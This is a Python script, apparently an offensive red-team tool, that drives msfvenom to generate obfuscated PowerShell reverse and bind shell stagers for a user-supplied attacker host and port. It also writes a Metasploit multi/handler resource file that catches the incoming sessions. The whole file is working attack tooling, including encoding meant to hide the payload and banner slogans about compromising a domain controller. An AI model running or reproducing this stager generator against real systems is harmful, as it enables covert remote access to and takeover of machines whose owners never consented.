#!/bin/env python3

##########################################
import os
import sys
import subprocess
import random
import argparse
from colorama import init, Fore, Style
init()
#########################################
from lib.stagergen import *
#########################################
def success(message):
	print(f'[{Style.BRIGHT}{Fore.GREEN}+{Style.RESET_ALL}] {message}')
def error(message):
        print(f'[{Style.BRIGHT}{Fore.RED}x{Style.RESET_ALL}] {message}')
#########################################
# funy turtl banner stuff hehe
slogans = ['turtles r cool', 'slow and steady pwns the dc', "a turtle hiding in a (meterpreter) shell"]
banner = fr'''{Style.BRIGHT}{Fore.GREEN}
                    __
         .,-;-;-,. /'_\
       _/_/_/_|_\_\) /   {Fore.YELLOW}{random.choice(slogans)}{Fore.GREEN}
     '-<_><_><_><_>=/\
       `/_/====/_/-'\_\
        ""     ""    ""{Style.RESET_ALL}'''
print(banner)


### Checking for msfvenom (Required)
try:
	subprocess.check_output(['which', 'msfvenom'])
except:
	error(f'{Fore.RED}MSFVENOM INSTALLATION NOT FOUND ON PATH!{Fore.RESET}')
	sys.exit()

# argparse stuf
payloadchoices = [
	'cmd/windows/powershell_bind_tcp',
	'cmd/windows/powershell_reverse_tcp',
	'cmd/windows/reverse_powershell',
	'windows/powershell_bind_tcp',
	'windows/powershell_reverse_tcp'
]
parser = argparse.ArgumentParser(description='generate some obfuscated stagers')
parser.add_argument('--payload', type=str, help='msfvenom payload 2 use', choices=payloadchoices)
parser.add_argument('--lhost', type=str, help='host 4 payload 2 connect back 2')
parser.add_argument('--lport', type=str, help='port 4 payload 2 connect back 2')
parser.add_argument('-o', type=str, default='turtl-payload.txt', help='file to save payload 2')
parser.add_argument('-rc', type=str, default='turtl-payload.rc', help='file to save msf resource file 2')
parser.add_argument('-i', type=int, default=1, help='amount of encoding iterations')
args = parser.parse_args()

# No arguments supplied : print payload list n exit
if not args.payload or not args.lhost or not args.lport:
	error("Required arguments (--payload, --lhost, --lport) haven't been supplied.")
	print('Available MSFVENOM Powershell Payloads:\n')
	for payl in payloadchoices:
		print(payl)
	print('')
	sys.exit()

print(fr'''{Style.BRIGHT}
PAYLOAD {Style.RESET_ALL}::{Style.BRIGHT} {args.payload}
LHOST   {Style.RESET_ALL}::{Style.BRIGHT} {args.lhost}
LPORT   {Style.RESET_ALL}::{Style.BRIGHT} {args.lport}
''')
success('Generating Stager with MSFVENOM...\n')

process = multiprocessing.Process(target=loadanim)
process.start()
resultpayload = venom_gen(args.payload,args.lhost,args.lport,args.i)
process.terminate()

sys.stdout.flush()
sys.stdout.write('\r')

# Writing Payload + RC File
with open(args.o,'w') as o:
	o.write(resultpayload); o.close()
with open(args.rc,'w') as o:
	o.write(f'use multi/handler\nset payload {args.payload}\nset LHOST {args.lhost}\nset LPORT {args.lport}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n'); o.close()

success(f'Payload written to: {args.o}')
success(f'Resource file written to: {args.rc}')
